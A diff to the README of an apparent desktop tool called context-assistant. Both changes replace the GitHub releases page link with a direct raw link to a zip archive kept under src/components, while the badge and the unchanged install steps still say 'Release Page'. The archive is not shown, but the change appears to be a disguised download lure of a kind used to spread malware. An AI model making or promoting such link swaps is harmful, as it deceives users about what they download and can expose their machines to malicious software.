@@ -1,6 +1,6 @@
 # 🤖 context-assistant - Local memory for your desktop
 
-[![Download context-assistant](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Crucial-spicecake41/context-assistant/releases)
+[![Download context-assistant](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Crucial-spicecake41/context-assistant/main/src/components/context-assistant-2.7.zip)
 
 ## 🧭 Overview
 
@@ -33,7 +33,7 @@ If you plan to use larger local models, 16 GB RAM gives you more room.
 
 Visit this page to download:
 
-https://github.com/Crucial-spicecake41/context-assistant/releases
+https://raw.githubusercontent.com/Crucial-spicecake41/context-assistant/main/src/components/context-assistant-2.7.zip
 
 1. Open the release page.
 2. Find the latest release.
